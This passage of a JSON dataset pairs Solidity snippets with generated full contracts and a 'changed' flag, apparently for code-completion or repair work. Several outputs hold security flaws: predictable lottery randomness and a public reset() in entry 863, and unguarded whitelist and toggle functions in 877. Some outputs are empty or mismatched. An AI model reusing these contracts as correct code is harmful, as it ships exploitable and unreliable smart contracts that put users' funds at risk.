        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint storedData;\n\n    function set(uint x) public {\n        storedData = x;\n    }\n\n    function get() public view returns (uint) {\n        return storedData;\n    }\n}\n\n",
        "changed": 0
    },
    "850.sol": {
        "input": "tokenContract.transfer(_to, _amount);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\ncontract MyContract {\n    IERC20 public tokenContract;\n    \n    constructor (address _tokenContract) {\n        tokenContract = IERC20(_tokenContract);\n    }\n    \n    function transferTokens(address _to, uint256 _amount) public {\n        tokenContract.transfer(_to, _amount);\n    }\n}\n\n",
        "changed": 0
    },
    "852.sol": {
        "input": "pragma solidity ^0.8.4;\n\ncontract TestContract {\n\n  struct Item {\n    uint itemId;\n    uint itemValue;\n  }\n\n  struct OverlayingItemStruct {\n    mapping(uint => Item) items;\n    uint overlayingId;\n    uint itemsCount;\n  }\n\n  mapping(uint => OverlayingItemStruct) public overlayingItems;\n  \n  uint public overlayCount;\n\n  function addOverlayingItemsStruct(uint _value) external {\n    overlayCount ++;\n    Item memory item = Item(1, _value);\n    overlayingItems[overlayCount].items[1] = item;\n  }\n\n  function addItem(uint _value, uint _overlayId) external {\n    OverlayingItemStruct storage overlay = overlayingItems[_overlayId];\n    overlay.itemsCount ++;\n    overlay.items[overlay.itemsCount] = Item(overlay.itemsCount, _value);\n  }\n}  \n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract TestContract {\n\n  struct Item {\n    uint itemId;\n    uint itemValue;\n  }\n\n  struct OverlayingItemStruct {\n    mapping(uint => Item) items;\n    uint overlayingId;\n    uint itemsCount;\n  }\n\n  mapping(uint => OverlayingItemStruct) public overlayingItems;\n  \n  uint public overlayCount;\n\n  function addOverlayingItemsStruct(uint _value) external {\n    overlayCount ++;\n    // NOTE: I declared a new Item struct\n    Item memory item = Item(1, _value);\n    // NOTE: I set into items mapping key value 1, Item struct created in row above this \n    overlayingItems[overlayCount].items[1] = item;\n  }\n\n  function addItem(uint _value, uint _overlayId) external {\n    OverlayingItemStruct storage overlay = overlayingItems[_overlayId];\n    overlay.itemsCount ++;\n    overlay.items[overlay.itemsCount] = Item(overlay.itemsCount, _value);\n  }\n}  \n\n",
        "changed": 0
    },
    "853.sol": {
        "input": "require(msg.sender.balance > 0 ether,\"You  Broke\");\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract SampleContract {\n\n    // This function is called for all messages sent to\n    // this contract (there is no other function).\n    // Sending Ether to this contract will cause an exception,\n    // because the fallback function does not have the \"payable\"\n    // modifier\n    function() external {\n        // msg.sender.balance is the current balance of the caller.\n        require(msg.sender.balance > 0 ether,\"You  Broke\");\n    }\n}\n\n",
        "changed": 0
    },
    "854.sol": {
        "input": "function isContract(address addressValue) public view returns (bool) {\n    uint size;\n    assembly { size := extcodesize(addressValue) }\n    return size > 0;\n}\n\n'\n\n pragma solidity 0.8.7;\n\n contract ContractIdentifier{\n\n      function isContract(address addressValue) public view returns (bool) {\n          uint size;\n          assembly { size := extcodesize(addressValue) }\n          return size > 0;\n      }\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ContractIdentifier {\n    function isContract(address addressValue) public view returns (bool) {\n        uint size;\n        assembly { size := extcodesize(addressValue) }\n        return size > 0;\n    }\n}\n\n",
        "changed": 0
    },
    "855.sol": {
        "input": "pragma solidity ^0.8.17;\n\ncontract Blockbook{\n    address payable public address1;\n    address payable public address2;\n    address payable public address3;\n\n    constructor(address payable _address1, address payable _address2, address payable _address3) public {\n        address1 = _address1;\n        address2 = _address2;\n        address3 = _address3;\n    }\n\n    function splitPayment(uint amount) public payable {\n        address1.transfer(amount * 0.8);\n        address2.transfer(amount * 0.1);\n        address3.transfer(amount * 0.1);\n    }\n\n    receive() external payable {\n        splitPayment(msg.value);\n    }\n\n    function updateAddresses(address payable _address1, address payable _address2, address payable _address3) public {\n        address1 = _address1;\n        address2 = _address2;\n        address3 = _address3;\n}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Blockbook {\n    address payable public address1;\n    address payable public address2;\n    address payable public address3;\n    address public owner;\n\n    constructor(address payable _address1, address payable _address2, address payable _address3) public {\n        address1 = _address1;\n        address2 = _address2;\n        address3 = _address3;\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner, 'Only the contract owner can call this function');\n        _;\n    }\n\n    function splitPayment() public payable {\n        require(msg.value > 0, 'Payment should be greater than 0');\n        uint256 amount = msg.value;\n        uint256 split1 = amount * 8 / 10;\n        uint256 split2 = amount / 10;\n        uint256 split3 = amount / 10;\n\n        address1.transfer(split1);\n        address2.transfer(split2);\n        address3.transfer(split3);\n    }\n\n    receive() external payable {\n        splitPayment();\n    }\n\n    function updateAddresses(address payable _address1, address payable _address2, address payable _address3) public onlyOwner {\n        address1 = _address1;\n        address2 = _address2;\n        address3 = _address3;\n    }\n}\n\n",
        "changed": 0
    },
    "856.sol": {
        "input": "pragma solidity 0.8.21;\n\ncontract MyContract {\n    function foo(string calldata someInput) external {\n        someInput = \"hello\";\n    }\n\n    function foo2(string memory someInput) external pure {\n        someInput = \"hello\";\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string public someInput;\n\n    function foo(string calldata _someInput) external {\n        someInput = _someInput;\n    }\n\n    function foo2(string calldata _someInput) external pure returns (string memory) {\n        return _someInput;\n    }\n}\n\n",
        "changed": 0
    },
    "857.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"./ContractB.sol\";\n\ncontract Counter is KeeperCompatibleInterface {\n    ContractB public contractB;\n    uint256 public counter;\n\n    constructor(ContractB _contractBAddress) {\n        contractB = _contractBAddress;\n    }\n\n    function performUpkeep(bytes calldata) external override {\n        counter = counter + 1;\n        contractB.setTokenName(counter);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface KeeperCompatibleInterface {\n    function performUpkeep(bytes calldata) external;\n}\n\ncontract ContractB {\n    string public tokenName;\n    \n    function setTokenName(uint256 _tokenId) public {\n        tokenName = string(abi.encodePacked(\"Token #\", uint2str(_tokenId)));\n    }\n    \n    function uint2str(uint256 _i) internal pure returns (string memory _uintAsString) {\n        if (_i == 0) {\n            return \"0\";\n        }\n        uint j = _i;\n        uint len;\n        while (j != 0) {\n            len++;\n            j /= 10;\n        }\n        bytes memory bstr = new bytes(len);\n        uint k = len - 1;\n        while (_i != 0) {\n            bstr[k--] = byte(uint8(48 + _i % 10));\n            _i /= 10;\n        }\n        return string(bstr);\n    }\n}\n\n",
        "changed": 0
    },
    "858.sol": {
        "input": "function triggerNFTWithdrawalToAddress(\n    address nftContractAddress,\n    uint256 tokenId,\n    address toAddress \n) public {\n    IERC721(nftContractAddress).safeTransferFrom(\n        address(this),\n        toAddress,\n        tokenId,\n        \"0x\"\n    );\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "860.sol": {
        "input": "pragma solidity ^0.8.8.0;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public myNumber;\n\n    function setMyNumber(uint256 _myNumber) public {\n        myNumber = _myNumber;\n    }\n\n    function getMyNumber() public view returns (uint256){\n        return myNumber;\n    }\n}\n\n",
        "changed": 0
    },
    "861.sol": {
        "input": "pragma solidity ^0.8.7;\n\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\n\n",
        "output": "",
        "changed": 0
    },
    "862.sol": {
        "input": "interface IExchangeRate {\n    function tinycentsToTinybars(uint256 tinycents) external returns (uint256);\n    function tinybarsToTinycents(uint256 tinybars) external returns (uint256);\n}\n\npragma solidity ^0.8.18;\n\ninterface IExchangeRate {\n    function tinycentsToTinybars(uint256 tinycents) external returns (uint256);\n\n    function tinybarsToTinycents(uint256 tinybars) external returns (uint256);\n}\n\ncontract Exchange {\n    IExchangeRate constant ExchangeRate =\n        IExchangeRate(address(0x168));\n\n    event ConversionResult(uint256 inAmount, uint256 outAmount);\n\n    function convert(uint256 usdCents) external returns (uint256 hbarCents) {\n        hbarCents = ExchangeRate.tinycentsToTinybars(usdCents * 100_000_000) / 1_000_000;\n        emit ConversionResult(usdCents, hbarCents);\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IExchangeRate {\n    function tinycentsToTinybars(uint256 tinycents) external view returns (uint256);\n    function tinybarsToTinycents(uint256 tinybars) external view returns (uint256);\n}\n\ncontract Exchange {\n    IExchangeRate private exchangeRate;\n\n    event ConversionResult(uint256 inAmount, uint256 outAmount);\n\n    constructor(address _exchangeRate) {\n        exchangeRate = IExchangeRate(_exchangeRate);\n    }\n\n    function convert(uint256 usdCents) external returns (uint256 hbarCents) {\n        hbarCents = exchangeRate.tinycentsToTinybars(usdCents * 100_000_000) / 1_000_000;\n        emit ConversionResult(usdCents, hbarCents);\n    }\n}\n",
        "changed": 0
    },
    "863.sol": {
        "input": "  return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, players,counter)));\n\n address payable[]  public players;\n\nplayers[index].transfer(address(this).balance);\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract Lottery {\n    // Array of players\n    address payable[] public players;\n    uint256 public counter;\n\n    // Function to join the lottery\n    function join() public payable {\n        require(msg.value > .01 ether, \"Not enough Ether provided.\");\n        players.push(msg.sender);\n        counter++;\n    }\n\n    // Function to pick a winner\n    function pickWinner() public view returns (address) {\n        require(players.length >= 3, \"Not enough players.\");\n        return players[random() % players.length];\n    }\n\n    // Function to transfer the contract balance to the winner\n    function payout() public {\n        require(players.length >= 3, \"Not enough players.\");\n        uint index = random() % players.length;\n        players[index].transfer(address(this).balance);\n    }\n\n    // Function to get a random index\n    function random() private view returns (uint) {\n        return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, players, counter)));\n    }\n\n    // Function to reset the lottery\n    function reset() public {\n        players = new address payable[](0);\n        counter = 0;\n    }\n}\n\n",
        "changed": 1
    },
    "864.sol": {
        "input": "pragma solidity 0.8.13;\n    \ncontract Array {\n    string[] public myArray;\n\n    function fillArrayMemory(string memory _word) public {\n        myArray.push(_word);\n    }\n    \n}\n\npragma solidity 0.8.13;\n    \ncontract Array {\n\n    function fillArrayMemory() public {\n        string[] memory _array = new string[](2);\n        _array[0] = \"test\";\n        _array[1] = \"test1\";\n    }\n    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Array {\n    string[] public myArray;\n\n    function fillArrayMemory(string memory _word) public {\n        myArray.push(_word);\n    }\n\n    function getArray() public view returns(string[] memory) {\n        return myArray;\n    }\n\n    function fillArrayMemory() public {\n        string[] memory _array = new string[](2);\n        _array[0] = \"test\";\n        _array[1] = \"test1\";\n\n        for(uint i=0; i<_array.length; i++) {\n            myArray.push(_array[i]);\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "866.sol": {
        "input": "address payable private owner;\n\nconstructor(){\n        owner = payable(msg.sender);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable private owner;\n\n    constructor() {\n        owner = payable(msg.sender);\n    } \n\n    function getOwner() public view returns (address) {\n        return owner;\n    }\n\n    function kill() public { \n        if (msg.sender == owner) {\n            selfdestruct(owner); \n        }\n    }\n}\n\n",
        "changed": 1
    },
    "867.sol": {
        "input": "payable(admin).transfer(balance[msg.sender]);\n\n  function depositMoneyToAdmin() payable public {\n        (bool success,) = admin.call{value: msg.value}(\"\");\n        balance[admin]+=msg.value;\n         require(success,\"Transfer failed!\");\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable public admin;\n    mapping(address => uint256) public balance;\n\n    constructor(address payable _admin) public {\n        admin = _admin;\n    }\n\n    function depositMoneyToAdmin() payable public {\n        (bool success,) = admin.call{value: msg.value}(\"\");\n        balance[admin]+=msg.value;\n        require(success,\"Transfer failed!\");\n    }\n\n    function transferMoneyToAdmin(uint256 amount) public {\n        require(balance[msg.sender] >= amount, \"Insufficient balance\");\n        balance[msg.sender] -= amount;\n        payable(admin).transfer(amount);\n    }\n\n    function getBalance() public view returns (uint256) {\n        return balance[msg.sender];\n    }\n}\n\n",
        "changed": 1
    },
    "868.sol": {
        "input": "\npragma solidity >=0.7.0 <0.9.0;\n\ncontract Storage {\n    struct Stake {\n        uint256 tokenId;\n        uint256 lockPeriod;\n        uint256 startDate;\n        address owner;\n    }\n   \n    mapping(uint256 => Stake) public vault; \n\n    function loadData(uint256 tokenId, uint256 lockPeriod, uint256 startDate, address owner) public {\n        Stake memory newStake = Stake(tokenId, lockPeriod, startDate, owner);\n        vault[tokenId] = newStake;\n    }\n    \n    function getNftInfo(uint256[] calldata tokenIdsInput) public view returns (uint256[] memory tokenIdsReturn,\n        uint256[] memory lockPeriodsReturn,\n        uint256[] memory startDatesReturn,\n        address[] memory ownersReturn){\n      uint256 tokenId;\n      uint256[] memory tokenIds = new uint256[](tokenIdsInput.length);\n      uint256[] memory lockPeriods = new uint256[](tokenIdsInput.length);\n      uint256[] memory startDates = new uint256[](tokenIdsInput.length);\n      address[] memory owners = new address[](tokenIdsInput.length);\n      for (uint i = 0; i < tokenIdsInput.length; i++) {\n          tokenId = tokenIdsInput[i];\n          Stake storage staked = vault[tokenId];\n          tokenIds[i] = staked.tokenId;\n          lockPeriods[i] = staked.lockPeriod;\n          startDates[i] = staked.startDate;\n          owners[i] = staked.owner;\n      }\n\n      return (tokenIds,\n        lockPeriods,\n        startDates,\n        owners);\n  }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity >=0.7.0 <0.9.0;\n\n/**\n * @title Storage\n * @dev Store & retrieve value in a variable\n * @custom:dev-run-script ./scripts/deploy_with_ethers.ts\n */\ncontract Storage {\n    struct Stake {\n        uint256 tokenId;\n        uint256 lockPeriod;\n        uint256 startDate;\n        address owner;\n    }\n   \n    mapping(uint256 => Stake) public vault; \n\n    function loadData(uint256 tokenId, uint256 lockPeriod, uint256 startDate, address owner) public {\n        Stake memory newStake = Stake(tokenId, lockPeriod, startDate, owner);\n        vault[tokenId] = newStake;\n    }\n    \n    function getNftInfo(uint256[] calldata tokenIdsInput) public view returns (uint256[] memory tokenIdsReturn,\n        uint256[] memory lockPeriodsReturn,\n        uint256[] memory startDatesReturn,\n        address[] memory ownersReturn){\n      uint256 tokenId;\n      uint256[] memory tokenIds = new uint256[](tokenIdsInput.length);\n      uint256[] memory lockPeriods = new uint256[](tokenIdsInput.length);\n      uint256[] memory startDates = new uint256[](tokenIdsInput.length);\n      address[] memory owners = new address[](tokenIdsInput.length);\n      for (uint i = 0; i < tokenIdsInput.length; i++) {\n          tokenId = tokenIdsInput[i];\n          Stake storage staked = vault[tokenId];\n          tokenIds[i] = staked.tokenId;\n          lockPeriods[i] = staked.lockPeriod;\n          startDates[i] = staked.startDate;\n          owners[i] = staked.owner;\n      }\n\n      return (tokenIds,\n        lockPeriods,\n        startDates,\n        owners);\n  }\n}\n\n",
        "changed": 0
    },
    "869.sol": {
        "input": "\ncontract ClaimWithSignature {\n\n    address public _owner;\n    mapping(address => uint8) _nonces;\n\n    \n    function claim (uint256 amount, uint8 nonce, uint8 v, bytes32 r, bytes32 s) public returns (bool) {\n\n        address user = msg.sender;\n        bytes memory hashStructRaw = abi.encode(\n            user,\n            amount,\n            nonce\n        );\n\n        bytes32 hashStruct = keccak256(hashStructRaw);\n        address signerRecovered = ecrecover(hashStruct, v, r, s);\n        \n        require(signerRecovered == _owner, \"invalid signature\");\n        require(nonce > _nonces[user], \"nonce too low\");\n\n\n        _nonces[user] = nonce;\n        return true;\n    }\n}\n\nimport { $abiUtils } from '@dequanto/utils/$abiUtils';\nimport { $contract } from '@dequanto/utils/$contract';\nimport { $signRaw } from '@dequanto/utils/$signRaw';\n\nexport async function getTxData (userId) {\n\n    let { user, amount, nonce } = loadUserData(userId);\n\n    let encodedParams = $abiUtils.encode([\n        'address',\n        'uint256',\n        'uint8',\n    ], [\n        user.address,\n        amount,\n        nonce\n    ]);\n    \n    let hash = $contract.keccak256(encodedParams);\n    \n    let { v, r, s } = await $signRaw.signEC(hash, owner.key);\n    \n\n    return { user, amount, nonce, v, r, s };\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ClaimWithSignature {\n\n    address public _owner;\n    mapping(address => uint8) _nonces;\n\n    constructor(address owner) public {\n        _owner = owner;\n    }\n\n    function claim(uint256 amount, uint8 nonce, uint8 v, bytes32 r, bytes32 s) public returns (bool) {\n\n        address user = msg.sender;\n\n        bytes32 hashStruct = keccak256(abi.encodePacked(user, amount, nonce));\n\n        address signerRecovered = ecrecover(hashStruct, v, r, s);\n\n        require(signerRecovered == _owner, \"invalid signature\");\n\n        require(nonce > _nonces[user], \"nonce too low\");\n\n        _nonces[user] = nonce;\n\n        return true;\n    }\n}\n\n",
        "changed": 0
    },
    "870.sol": {
        "input": "function getUniverseArray(address _address) public view returns (uint64[3] memory) {\n    return myUni[_address].space;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UniverseContract {\n    struct Universe {\n        uint64[3] space;\n    }\n\n    mapping(address => Universe) private myUni;\n\n    function setUniverseArray(address _address, uint64[3] memory _space) public {\n        myUni[_address].space = _space;\n    }\n\n    function getUniverseArray(address _address) public view returns (uint64[3] memory) {\n        return myUni[_address].space;\n    }\n}\n\n",
        "changed": 0
    },
    "871.sol": {
        "input": "pragma solidity 0.5.0;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n \n \ncontract GToken is ERC20, Ownable {\n     \n    constructor() ERC20() public {\n    _mint(msg.sender, 50 * (10**18));\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "872.sol": {
        "input": "import { deploy } from './ethers-lib'\n\n(async () => {\n    try {\n        const result = await deploy('Storage', [])\n        console.log(`address: ${result.address}`)\n    } catch (e) {\n        console.log(e.message)\n    }\n  })()\n\n  \n  contract ContractName {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ContractName {\n    string public message;\n\n    constructor(string memory initialMessage) {\n        message = initialMessage;\n    }\n\n    function setMessage(string memory newMessage) public {\n        message = newMessage;\n    }\n}\n\n",
        "changed": 0
    },
    "873.sol": {
        "input": "uint256 private lastTimeStamp;\nuint256 private interval;\n\nconstructor() {\n    lastTimeStamp = block.timestamp;\n    interval = 7 days;\n}\n\nfunction isTimePassed() public view returns (bool timePassed) {\n    timePassed = ((block.timestamp - lastTimeStamp) > \n interval);\n    return timePassed;\n}\n\nfunction smth() public {\n    (bool timePassed) = isTimePassed();\n    ...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TimeBasedContract {\n    uint256 private lastTimeStamp;\n    uint256 private interval;\n\n    constructor() public {\n        lastTimeStamp = block.timestamp;\n        interval = 7 days;\n    }\n\n    function isTimePassed() public view returns (bool timePassed) {\n        timePassed = ((block.timestamp - lastTimeStamp) > interval);\n        return timePassed;\n    }\n\n    function smth() public {\n        bool timePassed = isTimePassed();\n        if(timePassed){\n            // Do something here\n            lastTimeStamp = block.timestamp; // reset the timer\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "874.sol": {
        "input": "  uint256 amount = balanceOf(msg.sender);\n  transfer(newowner, amount);\n\n  function changeOwnership(address newowner) payable public {\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    mapping (address => uint256) public balanceOf;\n    address public owner;\n    string public name;\n    string public symbol;\n    uint8 public decimals = 18;\n    uint256 public totalSupply;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor(\n        uint256 initialSupply,\n        string memory tokenName,\n        string memory tokenSymbol\n    ) public {\n        totalSupply = initialSupply * 10 ** uint256(decimals);\n        balanceOf[msg.sender] = totalSupply;\n        name = tokenName;\n        symbol = tokenSymbol;\n        owner = msg.sender;\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balanceOf[msg.sender] >= _value);\n        balanceOf[msg.sender] -= _value;\n        balanceOf[_to] += _value;\n        emit Transfer(msg.sender, _to, _value);\n        return true;\n    }\n\n    function changeOwnership(address newowner) public payable {\n        require(msg.sender == owner);\n        uint256 amount = balanceOf[msg.sender];\n        transfer(newowner, amount);\n        owner = newowner;\n    }\n}\n\n",
        "changed": 1
    },
    "875.sol": {
        "input": "   address public  owner;\n\n  constructor()\n\n function transferOwnership(address newOwner) public onlyOwner{\n\nconstructor (string memory tokenName, string memory tokenSymbol, uint initialSupply) {\n\n  function _transfer(address _from,address _to,uint256 _value ) internal {\n    require(_to != 0x0000000000000000000000000000000000000000);\n\nfunction mintToken (address _target, uint256 _mintedAmount) public onlyOwner {\n        balanceOf[_target] += _mintedAmount;\n        totalSupply += _mintedAmount;\n        emit Transfer(address(0), owner, _mintedAmount);\n        emit Transfer(owner, _target, _mintedAmount);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Token {\n    string public tokenName;\n    string public tokenSymbol;\n    uint256 public totalSupply;\n    address public owner;\n    \n    mapping (address => uint256) public balanceOf;\n    \n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function.\");\n        _;\n    }\n\n    constructor(string memory _tokenName, string memory _tokenSymbol, uint256 initialSupply) public {\n        owner = msg.sender;\n        tokenName = _tokenName;\n        tokenSymbol = _tokenSymbol;\n        totalSupply = initialSupply;\n        balanceOf[msg.sender] = initialSupply;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        owner = newOwner;\n    }\n\n    function _transfer(address _from, address _to, uint256 _value) internal {\n        require(_to != address(0), \"Cannot transfer to the zero address\");\n        require(balanceOf[_from] >= _value, \"Insufficient balance\");\n        balanceOf[_from] -= _value;\n        balanceOf[_to] += _value;\n        emit Transfer(_from, _to, _value);\n    }\n\n    function mintToken(address _target, uint256 _mintedAmount) public onlyOwner {\n        balanceOf[_target] += _mintedAmount;\n        totalSupply += _mintedAmount;\n        emit Transfer(address(0), owner, _mintedAmount);\n        emit Transfer(owner, _target, _mintedAmount);\n    }\n}\n\n",
        "changed": 0
    },
    "877.sol": {
        "input": "modifier open(address from, address to) {\n    require(isOpen || _whiteList[from] || _whiteList[to], \"Not Open\");\n    _;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    bool public isOpen;\n    mapping(address => bool) public _whiteList;\n\n    constructor() public {\n        isOpen = false;\n    }\n    \n    modifier open(address from, address to) {\n        require(isOpen || _whiteList[from] || _whiteList[to], \"Not Open\");\n        _;\n    }\n\n    function addToWhiteList(address _address) public{\n        _whiteList[_address] = true;\n    }\n\n    function removeFromWhiteList(address _address) public{\n        _whiteList[_address] = false;\n    }\n\n    function toggleContractActive() public {\n        isOpen = !isOpen;\n    }\n\n    function transfer(address from, address to) public open(from, to) {\n        // Transfer logic goes here\n    }\n}\n\n",
        "changed": 0
    },
    "878.sol": {
        "input": "function getList() public view returns (ERC20[] memory){\n    return tokenList;\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "879.sol": {
        "input": "function exists1(uint num) public view returns (bool) {\n    for (uint i = 0; i < numbers1.length; i++) {\n        if (numbers1[i] == num) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nuint[] numbers1;\nmapping(uint => bool) public exists1; \n\nfunction push1(uint num1, uint num2, uint num3) public {\n    numbers1.push(num1);\n    numbers1.push(num2);\n    numbers1.push(num3);\n\n    exists1[num1] = true;\n    exists1[num2] = true;\n    exists1[num3] = true;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NumbersContract {\n    uint[] public numbers1;\n    mapping(uint => bool) public existsInNumbers1; \n\n    function exists1(uint num) public view returns (bool) {\n        return existsInNumbers1[num];\n    }\n\n    function push1(uint num1, uint num2, uint num3) public {\n        numbers1.push(num1);\n        numbers1.push(num2);\n        numbers1.push(num3);\n\n        existsInNumbers1[num1] = true;\n        existsInNumbers1[num2] = true;\n        existsInNumbers1[num3] = true;\n    }\n}\n\n",
        "changed": 0
    },
    "880.sol": {
        "input": "pragma solidity 0.8.8;\n\ncontract SimpleStorage {\n    bool HasFavoriteNumber = true;\n    uint256 public FavoriteNumber;\n    uint256 public testVar;\n\n    function store(uint256 _FavoriteNumber) public {\n        FavoriteNumber = _FavoriteNumber;\n        testVar += 5;\n    }\n    \n    function retrieve() public view returns(uint256){\n        return FavoriteNumber;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    bool public hasFavoriteNumber;\n    uint256 public favoriteNumber;\n    uint256 public testVar;\n\n    constructor() {\n        hasFavoriteNumber = true;\n        favoriteNumber = 0;\n        testVar = 0;\n    }\n\n    function store(uint256 _favoriteNumber) public {\n        favoriteNumber = _favoriteNumber;\n        testVar += 5;\n    }\n\n    function retrieve() public view returns(uint256){\n        return favoriteNumber;\n    }\n\n    function getTestVar() public view returns(uint256){\n        return testVar;\n    }\n}\n\n",
        "changed": 0
    },
    "882.sol": {
        "input": "function getWRequest(uint _index) public view returns(WRequest memory) {\n   return WRequestList[_index];\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract WRequestContract {\n    struct WRequest {\n        uint id;\n        string description;\n        bool completed;\n    }\n\n    WRequest[] public WRequestList;\n\n    constructor() public {\n        // Add some initial WRequests\n        WRequestList.push(WRequest(1, \"First WRequest\", false));\n        WRequestList.push(WRequest(2, \"Second WRequest\", false));\n    }\n\n    function getWRequest(uint _index) public view returns(WRequest memory) {\n        return WRequestList[_index];\n    }\n}\n\n",
        "changed": 0
    },
    "883.sol": {
        "input": "constructor() payable {\n        tokenA = new AliceCoin(100000);\n        tokenB = new BobCoin(100000);\n}\n\nconstructor(address _addressAliceCoin, address _addressBobCoin) payable {\n    tokenA = ERC20(_addressAliceCoin);\n    tokenB = ERC20(_addressBobCoin);\n }\n\nif(!AliceCoin(_tokenAddress).transfer(_recipient , _amount))\n            revert(\"transfer failed\");\n\nif(!AliceCoin(_tokenAddress).transferFrom(_recipient, address(this), _amount))\n        revert(\"transfer failed\")\n\n\npragma solidity ^0.8.1;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract AliceCoin is ERC20 {\n    constructor(uint256 supply) ERC20(\"AliceCoin\", \"ALI\") {\n        _mint(msg.sender, supply);\n    } \n}\n\ncontract BobCoin is ERC20{\n    constructor(uint256 supply) ERC20(\"BobCoin\", \"BOB\"){\n        _mint(msg.sender, supply);\n    }\n}\n\n\n\ncontract AtomicSwap{\n    ERC20 public tokenA;\n    ERC20 public tokenB;\n\n     constructor(address _addressAliceCoin, address _addressBobCoin) payable {\n        tokenA = ERC20(_addressAliceCoin);\n        tokenB = ERC20(_addressBobCoin);\n     }\n\n     \n    struct Swap {\n        \n        address payable recipient;\n        address payable Owner;\n        address tokenAddress;\n        uint256 amount;\n        uint256 timelock;\n        bytes32 Hashlock; \n        string secret; \n        bool refunded; \n        bool claimed;\n    }\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n    mapping(bytes32 => Swap) public swaps;\n\n\n    event NewAtomicSwap(\n        bytes32 swapId,\n        address payable Owner,\n        address payable recipient,\n        address tokenAddress,\n        uint256 amount,\n        bytes32 Hashlock,\n        uint256 timelock\n    );\n    event Claimed(\n        bytes32 swapId\n    );\n    event Refunded(\n        bytes32 swapId\n    );\n\n\n    modifier checkAllowance(address _token, address _Owner, uint256 _amount){\n        require(_amount > 0, \"Token amount must be greater than 0\");\n        require(ERC20(_token).allowance(_Owner, address(this)) >= _amount, \"Allowance must be greater than 0\");\n        _;\n    }\n\n    modifier futureTimelock(uint256 _time){\n        require(_time > block.timestamp, \"timelock has to be set in the future\");\n        _;\n    }\n\n    modifier claimable(bytes32 _swapId) {\n            require(swaps[_swapId].recipient == msg.sender, \"This is not the right recipient\");\n            require(swaps[_swapId].claimed == false, \"already claimed\");\n            require(swaps[_swapId].refunded == false, \"already refunded\");\n            _;\n    }\n\n    modifier matchingHashlocks(bytes32 _swapId, bytes32 _x){\n        require(\n            swaps[_swapId].Hashlock == keccak256(abi.encodePacked(_x)),\n            \"incorrect hashlock\"\n        );\n        _;\n    }\n\n    modifier existingContract(bytes32 _swapId) {\n        require(haveContract(_swapId), \"contract does not exist\");\n        _;\n    }\n\n    modifier refundable(bytes32 _swapId) {\n        require(swaps[_swapId].Owner == msg.sender, \"Only the sender of this coin can refund\");\n        require(swaps[_swapId].refunded == false, \"Already refunded\");\n        require(swaps[_swapId].claimed == false, \"Already claimed\");\n        require(swaps[_swapId].timelock <= block.timestamp, \"Timelock not yet passed\");\n        _;\n    }\n\n    function newSwap(\n        address payable _recipient, \n        bytes32 _Hashlock,\n        uint256 _timelock,\n        address _tokenAddress,\n        uint256 _amount\n        )\n    public  \n    payable\n    checkAllowance(_tokenAddress, msg.sender, _amount)\n    futureTimelock(_timelock)\n    returns(bytes32 swapId)\n    {\n        swapId = keccak256(\n            abi.encodePacked(\n                msg.sender,\n                _recipient,\n                _tokenAddress,\n                _amount,\n                _Hashlock,\n                _timelock\n            )\n        );\n\n        if(haveContract(swapId))\n            revert(\"Contract exists\");\n\n        if(!AliceCoin(_tokenAddress).transferFrom(_recipient, address(this), _amount))\n            revert(\"transfer failed\");\n\n\n\n        swaps[swapId] = Swap({\n            recipient : _recipient,\n            Owner : payable(_recipient),\n            tokenAddress : _tokenAddress,\n            amount : _amount,\n            timelock : block.timestamp + 60000,\n            Hashlock : _Hashlock,\n            secret : \"djkcoeuxhjkdf\",\n            refunded : 